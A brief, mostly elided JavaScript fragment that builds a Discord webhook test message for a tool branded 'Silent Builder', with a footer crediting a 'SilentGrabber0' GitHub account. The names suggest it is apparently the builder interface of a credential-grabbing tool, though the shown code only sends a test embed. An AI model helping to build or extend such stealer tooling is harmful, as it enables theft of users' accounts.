...
document.addEventListener('DOMContentLoaded', () => {
    ...
    async function sendTestEmbed(webhookURL) {
        const testEmbed = {
            ...
            author: {
                name: 'Silent Builder',
                icon_url: 'https://cdn.discordapp.com/attachments/1246337883623784468/1286415376753623142/Silent.png?ex=66edd32e&is=66ec81ae&hm=15fa24298cc6de7d50522b5776a0b46300abd41a55da30e9213599067dce2891&'
            },
            color: 0x303037,
            footer: {
                text: 'github.com/SilentGrabber0 | Made by discord.gg/alleyesonme',
            },
        };
